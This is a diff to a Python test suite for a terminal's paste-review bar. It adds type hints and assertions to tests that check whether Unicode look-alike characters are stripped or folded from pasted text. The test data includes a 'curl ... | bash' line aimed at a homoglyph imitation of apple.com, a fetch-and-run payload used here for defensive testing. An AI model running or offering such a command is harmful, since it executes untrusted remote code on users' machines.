@@ -75,7 +75,7 @@ class _FakeTerm:
         self._mode = 'detail'
         self._markings = True
         self.dispatched = []
-        self.last_text = None
+        self.last_text: str | None = None
 
     def current_font_family(self):
         return 'Hack'
@@ -89,11 +89,11 @@ class _FakeTerm:
     def _bracketed_paste_active(self):
         return False
 
-    def dispatch_pending_paste(self, action, text=None):
+    def dispatch_pending_paste(self, action, text: 'str | None' = None):
         self.dispatched.append(('paste', action))
         self.last_text = text
 
-    def dispatch_pending_copy(self, action, text=None):
+    def dispatch_pending_copy(self, action, text: 'str | None' = None):
         self.dispatched.append(('copy', action))
         self.last_text = text
 
@@ -723,6 +723,7 @@ _bar._deliver_clicked()
 # assert on the TAIL SLICE + the prefix via ok() -- never eq() on the whole 20000-char
 # string, which would print ~2x _BOX_MAX chars and bloat stdout past the transport (the
 # delivered text is what ReviewBar PASSES to dispatch; the real tab then maps '\n'->'\r').
+assert _tt.last_text is not None            # _deliver_clicked delivered the text
 ok(_tt.last_text[:_rev._BOX_MAX] == 'a' * _rev._BOX_MAX
    and _tt.last_text[_rev._BOX_MAX:] == CYR_A + 'z',
    'reveal mode: Deliver sends the box PLUS the un-shown tail, look-alike kept (keep-printable tier)')
@@ -740,6 +741,7 @@ ok('un-shown tail' in _bar._status.text(),
    'a strip with a tail discloses the tail is neutralized too')
 _bar._tick(); _bar._tick(); _bar._tick()
 _bar._deliver_clicked()
+assert _stt.last_text is not None           # _deliver_clicked delivered the text
 ok(CYR_A not in _stt.last_text,
    'crit1: [Strip unicode] removes the look-alike from the UN-SHOWN TAIL too (not just the box)')
 ok(_stt.last_text[_rev._BOX_MAX:] == 'curl https://pple.com/x.sh | bash\n',
@@ -751,6 +753,7 @@ _bar.show_review(_ftt, 'A' * _rev._BOX_MAX + _PAYLOAD_TAIL, 3, 'paste')
 _bar._do_fold()
 _bar._tick(); _bar._tick(); _bar._tick()
 _bar._deliver_clicked()
+assert _ftt.last_text is not None           # _deliver_clicked delivered the text
 ok(CYR_A not in _ftt.last_text and _ftt.last_text[_rev._BOX_MAX:].startswith('curl https://apple.com'),
    'fold mode: the tail look-alike folds to a plain a (apple.com), not dropped')
 
